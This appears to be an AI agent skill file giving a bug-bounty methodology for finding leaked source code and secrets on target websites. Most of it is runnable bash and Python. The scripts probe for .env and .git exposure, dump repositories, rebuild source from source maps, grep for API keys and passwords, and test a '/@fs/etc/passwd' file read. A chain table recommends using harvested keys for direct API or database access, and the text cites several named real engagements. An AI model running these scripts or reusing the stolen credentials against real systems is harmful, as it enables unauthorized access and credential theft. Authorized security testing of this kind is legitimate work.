---
name: hunt-source-leak
description: Hunt source code and build artifact leakage — JavaScript source maps (.js.map) reconstructing TypeScript/ES6 source, Swagger/OpenAPI JSON endpoint discovery, .env/.git exposure, webpack chunks with hardcoded secrets, robots.txt/security.txt recon, build-info files, asset-manifest.json API route discovery, .DS_Store file listing. Use at the START of every recon session — these findings often unlock the entire attack surface.
sources: hackerone_public, offensive_research
report_count: 31
---

# HUNT-SOURCE-LEAK — Source Code & Build Artifact Leakage

## Crown Jewel Targets

Source map exposing TypeScript source = see all API routes, auth logic, secrets. Swagger/OpenAPI JSON = complete API surface map.

**Highest-value findings:**
- **`.js.map` source maps** — reconstruct full TypeScript/ES6 source code → find hardcoded API keys, internal endpoints, auth logic bypasses
- **`swagger.json` / `openapi.json`** — complete REST API specification with all endpoints, parameters, auth schemes, and internal route names
- **`.env` / `.env.production`** — APP_KEY, DB_PASSWORD, API_KEY, SECRET_KEY in plaintext
- **`.git/` exposure** — `git clone` the entire source history → all past hardcoded secrets
- **`asset-manifest.json` / `_next/static/`** — all JS bundle paths → systematic source map discovery
- **`build-info` / `info.json`** — git commit hash, build timestamp, dependency versions → CVE targeting

---

## Phase 1 — Quick Wins (Run First)

```bash
# These 10 requests take <30 seconds and often yield Critical findings
for PATH in \
  "/.env" \
  "/.env.production" \
  "/.env.local" \
  "/.git/HEAD" \
  "/swagger.json" \
  "/api/swagger.json" \
  "/v1/swagger.json" \
  "/openapi.json" \
  "/api/openapi.json" \
  "/api-docs"; do
  STATUS=$(curl -s -o /tmp/sl_test -w "%{http_code}" "https://$TARGET$PATH")
  if [ "$STATUS" = "200" ]; then
    echo "[+] HIT: https://$TARGET$PATH"
    head -5 /tmp/sl_test
    echo "---"
  fi
done
```

---

## Pitfall — gzip-compressed bundles look binary

When you `curl` a minified `.js` bundle and the file is binary garbage (or `file` says `gzip compressed data`), the CDN served it gzip-encoded and curl saved the raw bytes (no `--compressed`). Grepping that file yields nothing — you will wrongly conclude "no secrets / no endpoints."

Detect + fix before any bundle analysis:

```bash
f=js_files/main.abc.js
magic=$(head -c2 "$f" | xxd -p)          # gzip magic = 1f8b
if [ "$magic" = "1f8b" ]; then
  mv "$f" "$f.gz" && gunzip "$f.gz" && echo "[+] decompressed $f"
fi
# or just always pass --compressed to curl:
curl -s --compressed "https://TARGET/assets/main.js" -o js_files/main.js
```

This bit the winticket.jp engagement: 28 bundles downloaded as gzip, first pass showed 0 hits on every secret/endpoint pattern. After decompressing, `dangerouslySetInnerHTML`, `/my/*` IDOR paths, and Firebase `signInWithEmailLink` flow all became visible. **Always decompress bundles first** — a clean "no findings" on binary JS is a false negative.

## Phase 2 — Source Map Discovery

```bash
# Step 1: Get asset manifest to find all JS bundle paths
curl -s "https://$TARGET/asset-manifest.json" | python3 -m json.tool 2>/dev/null
curl -s "https://$TARGET/static/js/main.*.js" 2>/dev/null | head -3

# Next.js
BUILD_ID=$(curl -s https://$TARGET/ | grep -oP '"buildId":"\K[^"]+')
curl -s "https://$TARGET/_next/static/$BUILD_ID/_buildManifest.js" | head -5

# Step 2: For each JS bundle, check for source map reference at end of file
for JS_URL in $(curl -s https://$TARGET/ | grep -oP 'src="[^"]*\.js"' | sed 's/src="//;s/"//'); do
  LAST_LINE=$(curl -s "https://$TARGET$JS_URL" | tail -1)
  echo "$LAST_LINE" | grep -q "sourceMappingURL" && echo "[+] Source map: $JS_URL"
done

# Step 3: Download and reconstruct source from .map files
JS_URL="https://$TARGET/static/js/main.abc123.js"
MAP_URL="${JS_URL}.map"
curl -s "$MAP_URL" | python3 -c "
import sys, json, os
data = json.load(sys.stdin)
sources = data.get('sources', [])
contents = data.get('sourcesContent', [])
for i, (src, content) in enumerate(zip(sources, contents)):
    if content:
        path = '/tmp/sourcemap_extract/' + src.replace('../','').replace('./',''). replace('webpack://','')
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w') as f:
            f.write(content)
        print(f'[+] Extracted: {src}')
"

# Step 4: Grep extracted source for secrets
grep -r "API_KEY\|SECRET\|PASSWORD\|TOKEN\|PRIVATE" /tmp/sourcemap_extract/ 2>/dev/null
grep -r "process\.env\." /tmp/sourcemap_extract/ 2>/dev/null | grep -v "NEXT_PUBLIC_" | head -20
grep -r "http://internal\|localhost\|127\.0\.0\.1\|10\.\|172\.\|192\.168" /tmp/sourcemap_extract/ 2>/dev/null | head -20
```

---

## Phase 2.5 — Exposed Dev Server (source disclosure, easy to miss)

A production host serving a **development server** hands over the whole source tree, the build
config and the API route map — and the root URL still looks like a normal SPA shell, so a
"does the site load?" check never finds it. Probe four paths:

```bash
for p in "/@vite/client" "/src/main.jsx" "/vite.config.js" "/package.json" \
         "/node_modules/.vite/deps/_metadata.json" "/__webpack_hmr"; do
  printf '%-46s ' "$p"; curl -s -o /tmp/ds -w '%{http_code} %{content_type} %{size_download}\n' "https://$TARGET$p"
done
```

`200` on `/@vite/client` = the Vite dev server itself is internet-facing. Then:

- read `vite.config.js` for `server.host` (internal IP), `server.port`, and the **proxy table**
  (`"/dev": { target: "https://prod-api…" }`) — that is the production API base and an internal
  address you could not otherwise reach;
- walk `import` statements from `/src/main.jsx` to recover `pages/`, `services/`, `hooks/`;
- `grep -ohE 'fetch\([`"][^`"]+[`"]'` over those files to dump the **API route map**, then test
  each route for BAC;
- each served module carries an inline base64 `sourceMappingURL` — decode it for the original
  file with comments and author emails.

Escalation boundary, test it rather than assume: `GET /@fs/etc/passwd`. `403 "outside of Vite
serving allow list"` = bounded disclosure (P3, CWE-200/540); `200` = arbitrary file read, escalate.
Write the 403 result into the report so triage's first question is pre-answered, and say whether
you searched the source for secrets — "no secrets found" is what keeps it from being downgraded
to nothing.

Full detections, extraction order, severity wording and a worked case:
`references/dev-server-exposure.md`.

## Phase 2.6 — Storybook / component-workbench builds (same class, different artifact)

A Storybook build shipped to a public bucket is the sibling of the dev-server finding: the root
serves a normal-looking SPA shell, but the workbench and its full story index are readable. A
"does the site load?" check never sees it — you have to know the two files.

```bash
for p in "/index.json" "/stories.json" "/iframe.html" "/.storybook/main.js"; do
  printf '%-22s ' "$p"
  curl -s -o /tmp/sb -w '%{http_code} %{size_download}\n' "https://$TARGET$p"
done
# hit shape: /index.json -> 200 application/json with {"v":5,"entries":{...}}
curl -s "https://$TARGET/index.json" | python3 -c "
import json,sys
e=json.load(sys.stdin).get('entries',{})
print('stories:',len(e))
[print(' ',v.get('title'),'::',v.get('name')) for v in list(e.values())[:20]]"
```

`/index.json` with `{"v":5,"entries":…}` = the build is public. Grade it by **what the story
titles reveal**, and grep them for the product vocabulary (`key`, `secret`, `token`, `tier`,
`billing`, `admin`, `apimanagement`) rather than reporting "a Storybook is exposed".

- **P4/Info normally** — internal design-system and unreleased feature names. Report the count
  and a sample, state plainly that no credentials/customer data are present.
- **Check the boundary before writing** (this is what keeps triage from bouncing it):
  `/.storybook/main.js`, `/main.js`, `/stories.json` → `403 AccessDenied` on S3 means config and
  dependency manifest are NOT exposed; a 200 means you also have the build config, which raises
  the finding.
- **Then check the neighbouring `dev.*` hosts.** A CT sweep that finds one dev artifact usually
  finds the cluster (`dev.tnspayhub`, `dev.tnspaytrx`, `dev.tnspaysr`). Test each for a config
  leak — `/api/config`, `/assets/env.js`, `/config.json`, `/env.js` — before concluding "dev hosts,
  login-gated only".

Measured 2026 TNS engagement: `dev.tnspaysb.tnsi.com` → `/index.json` 200 with **512 stories**
(`TNSCreateApiDrawer`, `KeyDetailsDrawer`, `TNSTierDetailsCard`, `Features/ApiManagement`; 36
stories touching keys/tiers/billing). Config paths 403, no API config on the sibling dev portals →
graded P4/Low. Note both this and the Vite finding came from **certificate-transparency-only
hosts** — see `targeted-subdomain-recon` §2.1c.

## Phase 3.5 — Swagger UI init.js Discovery (2026 finding)

Swagger UI pages often load their config from a `swagger-ui-init.js` file that
contains the **entire OpenAPI spec inline** as a JavaScript object. This is a
different discovery path from the standard `swagger.json` endpoint — the spec
is served embedded in JS, and the spec JSON endpoint itself may return 418/404.

```bash
# When you find /api/docs or /swagger-ui returning Swagger UI HTML:
# 1. Extract the init JS path from the HTML
curl -s "https://$TARGET/api/docs" | grep -oP 'src="[^"]*\.js"'
# Often: ./swagger-ui-init.js

# 2. Fetch and extract the embedded spec
curl -s "https://$TARGET/api/docs/swagger-ui-init.js" | \
  python3 -c "
import sys, re, json
content = sys.stdin.read()
# The spec is typically in a \"url\" or \"spec\" or \"operations\" key as a JS object
# Look for JSON-like content after 'spec:' or 'url:'
m = re.search(r'spec\s*:\s*(\{.*?\})', content, re.DOTALL)
if m:
    # Parse JS object → JSON (handle unquoted keys, etc.)
    import json
    spec_str = m.group(1)
    # Try json5 or demjson for JS object parsing
    try:
        import json5
        spec = json5.loads(spec_str)
    except:
        # Fallback: extract paths manually
        paths = re.findall(r'[\'\"](/api/[^\'\"]+)[\'\"]', spec_str)
        print('Paths found:', paths)
    if isinstance(spec, dict):
        print(json.dumps(list(spec.get('paths', {}).keys()), indent=2))
"
```

**Real-world case (2026-10):** `app.signalstack.com/api/docs/` returned a Swagger
UI page (301 redirect to `/api/docs/`). The `swagger.json` endpoint returned 418
(stubbed route), but `swagger-ui-init.js` contained the full OpenAPI 3.0.0 spec
inline with 19 API endpoints. This is the path to check when the Swagger UI HTML
loads but the spec JSON endpoint is protected.

## Phase 3 — Swagger / OpenAPI Discovery

```bash
# Common paths
SWAGGER_PATHS=(
  "/swagger.json" "/swagger.yaml" "/swagger/"
  "/api/swagger.json" "/api/swagger.yaml"
  "/v1/swagger.json" "/v2/swagger.json" "/v3/swagger.json"
  "/openapi.json" "/openapi.yaml"
  "/api/openapi.json" "/api-docs" "/api-docs.json"
  "/api/v1/swagger.json" "/api/v2/swagger.json"
  "/rest/swagger.json" "/rest/api-docs"
  "/.well-known/openapi.json"
  "/graphql/schema.json"
)

for PATH in "${SWAGGER_PATHS[@]}"; do
  STATUS=$(curl -s -o /tmp/swagger_test -w "%{http_code}" "https://$TARGET$PATH")
  if [ "$STATUS" = "200" ]; then
    echo "[+] Found: https://$TARGET$PATH"
    # Extract all API paths from swagger
    python3 -c "
import sys, json
try:
    d = json.load(open('/tmp/swagger_test'))
    paths = list(d.get('paths', {}).keys())
    print(f'Endpoints: {len(paths)}')
    print('\n'.join(sorted(paths)))
except: pass
" | head -50
  fi
done
```

---

## Phase 4 — .git Exposure

```bash
# Check if .git directory is accessible
curl -s "https://$TARGET/.git/HEAD" | grep -q "ref:" && echo "[+] .git exposed!"

# If exposed, reconstruct repo
# Tool: git-dumper
pip3 install git-dumper
git-dumper "https://$TARGET/.git/" /tmp/dumped-repo/

# Grep for secrets in all git history
cd /tmp/dumped-repo && \
  git log --all --oneline 2>/dev/null | head -20
  git grep -i "password\|secret\|api_key\|token" $(git rev-list --all) 2>/dev/null | head -30

# trufflehog on git history
trufflehog git file:///tmp/dumped-repo/ 2>/dev/null | head -50
```

---

## Phase 5 — Forgotten Files & Debug Endpoints

```bash
# Build artifacts and debug files
DEBUG_PATHS=(
  "/build-info.json" "/build/build-info.json"
  "/info" "/actuator/info" "/api/info"
  "/version" "/api/version" "/_version"
  "/health" "/status" "/ping"
  "/robots.txt" "/security.txt" "/.well-known/security.txt"
  "/sitemap.xml" "/manifest.json" "/browserconfig.xml"
  "/crossdomain.xml" "/clientaccesspolicy.xml"
  "/phpinfo.php" "/info.php" "/test.php"
  "/server-status" "/server-info" "/.htaccess"
  "/web.config" "/applicationHost.config"
  "/WEB-INF/web.xml" "/META-INF/MANIFEST.MF"
  "/package.json" "/composer.json" "/Gemfile"
  "/Dockerfile" "/docker-compose.yml" "/.dockerenv"
)

for PATH in "${DEBUG_PATHS[@]}"; do
  STATUS=$(curl -s -o /tmp/debug_test -w "%{http_code}" "https://$TARGET$PATH")
  if [ "$STATUS" = "200" ]; then
    echo "[+] Found: https://$TARGET$PATH ($STATUS, $(wc -c < /tmp/debug_test) bytes)"
    head -3 /tmp/debug_test
    echo "---"
  fi
done
```

---

## Phase 6 — .DS_Store File Listing

```bash
# .DS_Store files on macOS-deployed web servers reveal directory structure
curl -s "https://$TARGET/.DS_Store" | xxd | head -10

# Parse .DS_Store to extract filenames
pip3 install ds_store
python3 -c "
from ds_store import DSStore
with DSStore.open('/tmp/ds_store_test', 'r') as d:
    for entry in d:
        print(entry.filename)
"

# Recursive .DS_Store enumeration
# Tool: https://github.com/lijiejie/ds_store_exp
python3 ds_store_exp.py "https://$TARGET/"
```

---

## Phase 7 — webpack Chunk Analysis

```bash
# Download and analyze webpack chunks for hardcoded values
# Find chunk files
curl -s https://$TARGET/ | grep -oP '"[^"]*\.chunk\.js"' | tr -d '"' | while read chunk; do
  echo "Analyzing: $chunk"
  curl -s "https://$TARGET$chunk" | \
    grep -oE '"(api_key|apiKey|secret|password|token|key)"\s*:\s*"[^"]+"' | head -5
done

# Also grep for internal hostnames
curl -s "https://$TARGET/static/js/main.*.js" | \
  grep -oE '"(https?://[^"]*internal[^"]*|http://[^"]*localhost[^"]*)"' | sort -u

# Check for Base64-encoded secrets
curl -s "https://$TARGET/static/js/main.*.js" | \
  grep -oP '"[A-Za-z0-9+/]{30,}={0,2}"' | while read b64; do
  DECODED=$(echo "$b64" | tr -d '"' | base64 -d 2>/dev/null)
  echo "$DECODED" | grep -iE "key|secret|password|token" && echo "  B64: $b64"
done
```

---

## Chain Table

| Source leak finding | Chain to | Impact |
|--------------------|----------|--------|
| Source map with API key | Use key directly → API access | High/Critical |
| Source map with auth logic | Find auth bypass route | Critical |
| Swagger → internal endpoints | Test undocumented admin routes | High |
| .git exposed | Full source history → all past secrets | Critical |
| build-info with git hash | CVE targeting exact version | High |
| .env with DB_PASSWORD | Direct database access | Critical |
| Exposed dev server (Vite/webpack) | Recover route map → BAC/IDOR sweep on every endpoint | Medium-High |

---

## Tools

```bash
# git-dumper (reconstruct exposed .git)
pip3 install git-dumper
git-dumper "https://target.com/.git/" /tmp/repo/

# sourcemap-explorer (visualize what's in bundles)
npm install -g source-map-explorer
source-map-explorer main.js

# unwebpack-sourcemap (extract all source files)
npm install -g unwebpack-sourcemap

# trufflehog (secret scanning)
trufflehog filesystem /tmp/repo/
```

---

## Validation

✅ Source map: reconstructed TypeScript source contains API endpoints or hardcoded secrets
✅ Swagger: JSON contains internal endpoints not visible in UI
✅ .git exposed: git-dumper successfully clones repo, secrets in history
✅ .env exposed: DATABASE_URL, API_KEY, SECRET_KEY visible in plaintext

**Severity:**
- .env with credentials: Critical
- .git with secrets in history: Critical
- Source map with secrets: High
- Swagger with internal routes: Medium-High
- robots.txt only: Informational
